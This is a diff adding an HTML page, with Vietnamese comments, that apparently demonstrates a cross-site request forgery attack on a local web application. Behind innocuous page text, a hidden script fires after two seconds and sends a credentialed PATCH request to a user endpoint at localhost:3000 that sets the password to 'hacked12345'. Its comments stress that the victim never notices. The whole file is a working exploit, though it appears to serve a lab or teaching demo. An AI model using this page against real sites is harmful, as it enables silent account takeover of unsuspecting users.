@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - AJAX Method</title>
+</head>
+<body>
+    <h1>Trang web bình thường</h1>
+    <p>Người dùng đang đọc nội dung...</p>
+    
+    <!-- CSRF Attack bằng AJAX - Hoàn toàn ẩn -->
+    <script>
+        // CSRF Attack sử dụng AJAX
+        function performCSRFAttack() {
+            const formData = new FormData();
+            formData.append('_method', 'PATCH');
+            formData.append('user[password]', 'hacked12345');
+            formData.append('user[password_confirmation]', 'hacked12345');
+            formData.append('csrf_demo', 'true');
+            
+            fetch('http://localhost:3000/users/1', {
+                method: 'POST',
+                body: formData,
+                credentials: 'include' // Gửi cookies
+            })
+            .then(response => {
+                console.log('CSRF attack thành công!');
+                // Không redirect, user không biết gì
+            })
+            .catch(error => {
+                console.log('CSRF attack failed:', error);
+            });
+        }
+        
+        // Thực hiện attack sau 2 giây
+        setTimeout(performCSRFAttack, 2000);
+    </script>
+    
+    <div class="content">
+        <h2>Nội dung thú vị</h2>
+        <p>User đang đọc và không biết mật khẩu đã bị đổi...</p>
+    </div>
+</body>
+</html>
